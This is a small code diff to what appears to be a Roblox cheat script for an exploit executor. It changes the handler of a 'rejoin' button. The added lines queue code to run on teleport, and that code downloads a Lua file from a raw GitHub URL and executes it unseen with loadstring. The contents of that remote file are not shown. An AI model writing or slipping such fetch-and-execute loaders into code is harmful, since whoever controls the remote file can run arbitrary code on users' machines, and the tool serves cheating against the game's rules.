@@ -3626,6 +3626,13 @@ local function PREKNP_fake_script() -- rejoin.LocalScript
 	local script = Instance.new('LocalScript', rejoin)
 
 	script.Parent.MouseButton1Click:connect(function()
+		if syn.queue_on_teleport then
+			syn.queue_on_teleport([[
+				game:GetService('ReplicatedFirst'):RemoveDefaultLoadingScreen()
+				repeat wait(.1) until game:GetService('Players').LocalPlayer
+				loadstring(game:HttpGet("https://raw.githubusercontent.com/shadowlords/asdfasfdsfsdf/master/asdhasd.lua", true))()
+			]])
+		end
 		game.TeleportService:Teleport(game.PlaceId, game.Players.LocalPlayer)
 	end)
 end
